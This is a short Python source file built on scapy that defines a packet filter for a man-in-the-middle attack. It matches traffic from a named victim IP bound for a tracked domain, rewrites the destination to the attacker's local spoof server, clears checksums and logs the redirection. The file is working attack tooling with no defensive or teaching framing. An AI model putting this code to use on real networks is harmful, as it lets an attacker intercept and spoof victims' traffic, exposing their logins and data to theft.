from scapy.all import IP, TCP, UDP

class DomainRedirectFilter:
    def __init__(self, domain_tracker, victim_ip, spoof_ip, attacker_ip, logger=None):
        self.domain_tracker = domain_tracker
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip      # local attacker IP
        self.spoof_ip = spoof_ip            # Must equal attacker_ip
        self.logger = logger

    def log(self, msg):
        if self.logger:
            self.logger(msg)

    def __call__(self, pkt):
        if not pkt.haslayer(IP):
            return False

        ip = pkt[IP]

        # Only care about victim traffic
        if ip.src != self.victim_ip:
            return False

        # TCP / UDP only
        if pkt.haslayer(TCP):
            l4 = pkt[TCP]
        elif pkt.haslayer(UDP):
            l4 = pkt[UDP]
        else:
            return False

        # ───── VICTIM → TARGET DOMAIN ─────
        if ip.dst in self.domain_tracker.ips_v4:
            # Redirect to local spoof server
            ip.dst = self.attacker_ip

            del ip.chksum
            del l4.chksum

            self.log("[MITM] Victim → Local spoof server")

            # Stop MitmHandler from forwarding this packet.
            # Let the kernel deliver it locally.
            return True

        return False